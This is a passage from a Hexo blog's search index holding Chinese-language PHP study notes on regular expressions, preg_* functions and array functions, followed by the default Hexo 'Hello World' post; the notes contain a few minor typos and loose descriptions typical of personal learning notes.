匹配前面的字符一次或多次*        匹配前面的字符零次或多次{n,}    匹配前面的字符n次{,m}    匹配前面的字符最少n次{n,m}    匹配前面的字符最少n次 最多m次</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-点号字符"><a href="#nbsp-nbsp-nbsp-nbsp-点号字符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;点号字符( . )"></a>&nbsp;&nbsp;&nbsp;&nbsp;点号字符( . )</h4><p>&nbsp;&nbsp;点号可以<strong>匹配出换行符外的任意一个字符</strong></p><pre><code>匹配s开头、t结尾、中间一个任意字母的单词：    ^s.t$匹配第一个字母为r、第三个为s、最后一个为t：    ^r.s.*t$</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-转义字符"><a href="#nbsp-nbsp-nbsp-nbsp-转义字符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;转义字符( \ )"></a>&nbsp;&nbsp;&nbsp;&nbsp;转义字符( \ )</h4><p>&nbsp;&nbsp;和普通用法里面差不多，都是将<strong>特殊字符转义为普通字符</strong></p><pre><code>匹配IP地址：[0-9]{1,3}(.[0-9]{1,3}){3}</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-反斜线"><a href="#nbsp-nbsp-nbsp-nbsp-反斜线" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;反斜线()"></a>&nbsp;&nbsp;&nbsp;&nbsp;反斜线()</h4><p>&nbsp;&nbsp;反斜线除了做转义字符以外，还可以<strong>显示不可打印字符，指定预定义字符集、定义断言</strong></p><pre><code>显示不可打印字符：    \a        警报指定预定义字符集：    \d        任意一个十进制数字定义断言;            例如前面介绍的\b \B</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-括号字符"><a href="#nbsp-nbsp-nbsp-nbsp-括号字符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;括号字符()"></a>&nbsp;&nbsp;&nbsp;&nbsp;括号字符()</h4><p>&nbsp;&nbsp;括号第一个作用就是<strong>改变限定符的作用范围</strong></p><p>&nbsp;&nbsp;第二个作用就是分组</p><pre><code>分组：例如前面匹配IP地址，括号加上表示对分组进行重复操作</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-反向作用"><a href="#nbsp-nbsp-nbsp-nbsp-反向作用" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;反向作用"></a>&nbsp;&nbsp;&nbsp;&nbsp;反向作用</h4><p>&nbsp;&nbsp;反向引用就是依靠子表达式的记忆功能来匹配连续出现的字符串或字母</p><h4 id="nbsp-nbsp-nbsp-nbsp-模式修饰符"><a href="#nbsp-nbsp-nbsp-nbsp-模式修饰符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;模式修饰符"></a>&nbsp;&nbsp;&nbsp;&nbsp;模式修饰符</h4><p>&nbsp;&nbsp;模式修饰符的作用就是设定模式，规定正则表达式应该如何解释和应用</p><pre><code>i    忽略大小写模式    写法 (?i)...(?-i) or (?i:...)m    多文本模式        写法 如上，换个字母即可s    单文本模式        写法 如上x    忽略空白字符        写法 如上</code></pre><p>&nbsp;</p><h3 id="nbsp-nbsp-PCRE兼容正则表达式函数"><a href="#nbsp-nbsp-PCRE兼容正则表达式函数" class="headerlink" title="&nbsp;&nbsp;PCRE兼容正则表达式函数"></a>&nbsp;&nbsp;PCRE兼容正则表达式函数</h3><h4 id="nbsp-nbsp-nbsp-nbsp-preg-grep-函数"><a href="#nbsp-nbsp-nbsp-nbsp-preg-grep-函数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;preg_grep()函数"></a>&nbsp;&nbsp;&nbsp;&nbsp;preg_grep()函数</h4><p>&nbsp;&nbsp;该函数使用数组input中的元素一一匹配表达式pattern，最后返回由所有相匹配的元素所组成的数组。</p><pre><code>array preg_grep( string pattern,array input )</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-preg-match-和preg-match-all-函数"><a href="#nbsp-nbsp-nbsp-nbsp-preg-match-和preg-match-all-函数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;preg_match()和preg_match_all()函数"></a>&nbsp;&nbsp;&nbsp;&nbsp;preg_match()和preg_match_all()函数</h4><p>&nbsp;&nbsp;在字符串subject中匹配表达式pattern，函数返回匹配的次数。如果有数组matches，那每次匹配的结果都会存储到数组matches中。</p><pre><code>int preg_match/preg_match_all(string pattern,string subject[,array matches])</code></pre><p>&nbsp;<br>&nbsp;&nbsp;对于<strong>preg_match()函数的返回值只会是0和1</strong>，因为该函数在<strong>匹配成功一次后便停止继续查找</strong>。而<strong>preg_match_all()则会匹配到最后才会停止</strong>。故对于preg_match()来说,matches数组可有可无，但对preg_match_all()函数来说则必须有。</p><h4 id="nbsp-nbsp-nbsp-nbsp-preg-quote-函数"><a href="#nbsp-nbsp-nbsp-nbsp-preg-quote-函数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;preg_quote()函数"></a>&nbsp;&nbsp;&nbsp;&nbsp;preg_quote()函数</h4><p>&nbsp;&nbsp;函数将字符串str中的所有特殊字符串进行自动转义，如果有参数delimiter，那么该参数所包含的字符串也将被转义。</p><pre><code>string preg_quote(string str[,string delimiter])</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-preg-replace-函数"><a href="#nbsp-nbsp-nbsp-nbsp-preg-replace-函数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;preg_replace()函数"></a>&nbsp;&nbsp;&nbsp;&nbsp;preg_replace()函数</h4><p>&nbsp;&nbsp;函数在字符串subject中匹配表达式pattern，并将匹配项替换成字符串replacement，如果有参数limit，则替换limit次。</p><pre><code>mixed preg_replace(mixed pattern,mixed replacement,mixed subject[,int limit])</code></pre><h4 id="nbsp-nbsp-nbsp-nbsp-preg-replace-callback-函数"><a href="#nbsp-nbsp-nbsp-nbsp-preg-replace-callback-函数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;preg_replace_callback()函数"></a>&nbsp;&nbsp;&nbsp;&nbsp;preg_replace_callback()函数</h4><p>&nbsp;&nbsp;与preg_replace()函数功能相同，都用于查找和替换字串。不同的是，preg_replace_callback()函数使用一个回调函数来代替replacement参数。</p><pre><code>mixed preg_callback(mixed pattern,callback callback,mixed subject[,int limit])</code></pre><h4 id="nbsp-nbsp-nbsp-nbsp-preg-split-函数"><a href="#nbsp-nbsp-nbsp-nbsp-preg-split-函数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;preg_split()函数"></a>&nbsp;&nbsp;&nbsp;&nbsp;preg_split()函数</h4><p>&nbsp;&nbsp;使用表达式pattern来分割subject。如果有参数limit，数组最多有limit个元素。</p><pre><code>array preg_split(string pattern,string subject[,int limit])</code></pre><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="nbsp-nbsp-声明数组"><a href="#nbsp-nbsp-声明数组" class="headerlink" title="&nbsp;&nbsp;声明数组"></a>&nbsp;&nbsp;声明数组</h3><p>&nbsp;&nbsp;主要有两种声明方式，一种是array()函数，另一种是通过为数组元素赋值的方式声明数组。</p><pre><code>array array([mixed,...])mixed 的语法为key =&gt; value,多个参数mixed间用逗号隔开，分别定义了索引和值定义数组：    $array = array(&quot;asp&quot;,&quot;php&quot;,&quot;jsp&quot;)；或：    $array = array(&quot;1&quot;=&gt;&quot;asp&quot;,&quot;2&quot;=&gt;&quot;php&quot;);还可以:    $array[1]=&quot;asp&quot;;    $array[2]=&quot;php&quot;;输出下标元素:    echo $array[1];（单个）或    print_r($array)；（所有）</code></pre><p>&nbsp;</p><h3 id="nbsp-nbsp-数组的类型"><a href="#nbsp-nbsp-数组的类型" class="headerlink" title="&nbsp;&nbsp;数组的类型"></a>&nbsp;&nbsp;数组的类型</h3><p>&nbsp;&nbsp;PHP支持两种数组，索引数组（indexed array）和联合数组（associative array）。</p><h4 id="nbsp-nbsp-nbsp-nbsp-数字索引数组"><a href="#nbsp-nbsp-nbsp-nbsp-数字索引数组" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;数字索引数组"></a>&nbsp;&nbsp;&nbsp;&nbsp;数字索引数组</h4><p>&nbsp;&nbsp;数字索引一般表示数组元素在数组中的位置，由数字组成，下标从0开始</p><h4 id="nbsp-nbsp-nbsp-nbsp-关联数组"><a href="#nbsp-nbsp-nbsp-nbsp-关联数组" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;关联数组"></a>&nbsp;&nbsp;&nbsp;&nbsp;关联数组</h4><p>&nbsp;&nbsp;关联数组的键名可以是数值和字符串混合的形式，只要有一个键名不是数字，那么就是关联数组。（就是将diy键名）</p><h3 id="nbsp-nbsp-输出数组"><a href="#nbsp-nbsp-输出数组" class="headerlink" title="&nbsp;&nbsp;输出数组"></a>&nbsp;&nbsp;输出数组</h3><p>&nbsp;&nbsp;输出数组可以使用echo、print语句，但是只能对数组的某元素进行输出，print_r()则可以输出数组结构。</p><pre><code>bool print_r(mixed expression)</code></pre><h3 id="nbsp-nbsp-数组构造"><a href="#nbsp-nbsp-数组构造" class="headerlink" title="&nbsp;&nbsp;数组构造"></a>&nbsp;&nbsp;数组构造</h3><h4 id="nbsp-nbsp-nbsp-nbsp-一维数组"><a href="#nbsp-nbsp-nbsp-nbsp-一维数组" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;一维数组"></a>&nbsp;&nbsp;&nbsp;&nbsp;一维数组</h4><p>&nbsp;&nbsp;当一个数组的元素是变量时，称为一维数组。</p><h4 id="nbsp-nbsp-nbsp-nbsp-二维数组"><a href="#nbsp-nbsp-nbsp-nbsp-二维数组" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;二维数组"></a>&nbsp;&nbsp;&nbsp;&nbsp;二维数组</h4><p>&nbsp;&nbsp;当一个数组的元素一维数组（套娃），则称为二维数组。</p><h3 id="nbsp-nbsp-遍历数组"><a href="#nbsp-nbsp-遍历数组" class="headerlink" title="&nbsp;&nbsp;遍历数组"></a>&nbsp;&nbsp;遍历数组</h3><h4 id="nbsp-nbsp-nbsp-nbsp-foreach结构遍历"><a href="#nbsp-nbsp-nbsp-nbsp-foreach结构遍历" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;foreach结构遍历"></a>&nbsp;&nbsp;&nbsp;&nbsp;foreach结构遍历</h4><p>&nbsp;&nbsp;如上</p><h4 id="nbsp-nbsp-nbsp-nbsp-list-函数遍历"><a href="#nbsp-nbsp-nbsp-nbsp-list-函数遍历" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;list()函数遍历"></a>&nbsp;&nbsp;&nbsp;&nbsp;list()函数遍历</h4><p>&nbsp;&nbsp;把数组中的值赋给一些变量</p><pre><code>void list(mixed ...)each()函数用于返回当前指针位置的数组值，并将指针推进一个位置</code></pre><h3 id="nbsp-nbsp-字符串与数组的转换"><a href="#nbsp-nbsp-字符串与数组的转换" class="headerlink" title="&nbsp;&nbsp;字符串与数组的转换"></a>&nbsp;&nbsp;字符串与数组的转换</h3><h4 id="nbsp-nbsp-nbsp-nbsp-explode-函数"><a href="#nbsp-nbsp-nbsp-nbsp-explode-函数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;explode()函数"></a>&nbsp;&nbsp;&nbsp;&nbsp;explode()函数</h4><p>&nbsp;&nbsp;explode()函数将字符串依指定的字符串或字符separator打开</p><pre><code>array explode(string separator,string string,[int limit])返回由字符串组成的数组，每个元素都是string的一个子串，她们被字符串separator作为边界点分隔</code></pre><h4 id="nbsp-nbsp-nbsp-nbsp-implode-函数"><a href="#nbsp-nbsp-nbsp-nbsp-implode-函数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;implode()函数"></a>&nbsp;&nbsp;&nbsp;&nbsp;implode()函数</h4><p>&nbsp;&nbsp;implode()函数用于将数组的内容合成一个字符串</p><pre><code>string implode(string glue,array pieces)glue是字符串类型，指要传入的分隔符。pieces是数组类型，指传入的要合并元素的数组变量名称</code></pre><h3 id="nbsp-nbsp-统计数组元素个数"><a href="#nbsp-nbsp-统计数组元素个数" class="headerlink" title="&nbsp;&nbsp;统计数组元素个数"></a>&nbsp;&nbsp;统计数组元素个数</h3><p>&nbsp;&nbsp;通过count()函数对数组中的元素个数进行统计</p><pre><code>int count(mixed array[,int mode])array     必要数组，输入的数组mode    可选数组，COUNT_RECURSIVE或1，若选中则递归地对数组进行计数，默认为0</code></pre><h3 id="nbsp-nbsp-查询数组中指定元素"><a href="#nbsp-nbsp-查询数组中指定元素" class="headerlink" title="&nbsp;&nbsp;查询数组中指定元素"></a>&nbsp;&nbsp;查询数组中指定元素</h3><p>&nbsp;&nbsp;array_search函数用于在数组中搜索给定的值，找到后返回键名，否则返回false</p><pre><code>mixed array_search(mixed needle,array haystack[,bool strict])needle        指定在数组中搜索的值haystack    指定被搜索的数组strict        可选参数，值为true将在数组中检查给定值的类型</code></pre><h3 id="nbsp-nbsp-获取数组中最后一个元素"><a href="#nbsp-nbsp-获取数组中最后一个元素" class="headerlink" title="&nbsp;&nbsp;获取数组中最后一个元素"></a>&nbsp;&nbsp;获取数组中最后一个元素</h3><p>&nbsp;&nbsp;array_pop函数获取并返回数组的最后一个元素，并将数组长度减1，数组空则返回null</p><pre><code>pop_array(array array)</code></pre><h3 id="nbsp-nbsp-向数组中添加元素"><a href="#nbsp-nbsp-向数组中添加元素" class="headerlink" title="&nbsp;&nbsp;向数组中添加元素"></a>&nbsp;&nbsp;向数组中添加元素</h3><p>&nbsp;&nbsp;array_push函数将数组当作一个栈，将传入的变量压入该数组的末尾</p><pre><code>array_push(array array,mixed var[,]mixed....)array    指定的数组var        压入数组的值</code></pre><h3 id="nbsp-nbsp-删除数组中重读元素"><a href="#nbsp-nbsp-删除数组中重读元素" class="headerlink" title="&nbsp;&nbsp;删除数组中重读元素"></a>&nbsp;&nbsp;删除数组中重读元素</h3><p>&nbsp;&nbsp;array_unique函数用于将值作为字符串排序，然后对每个值保留第一个键名，忽略所有后面的键名</p><pre><code>array array_unique(array array)array    输入的数组</code></pre>]]></content>
    
    
    <categories>
      
      <category>语法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/07/30/hello-world/"/>
    <url>/2020/07/30/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="hljs bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="hljs bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="hljs bash">$ hexo deploy</code></pre><p>&nbsp; </p><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
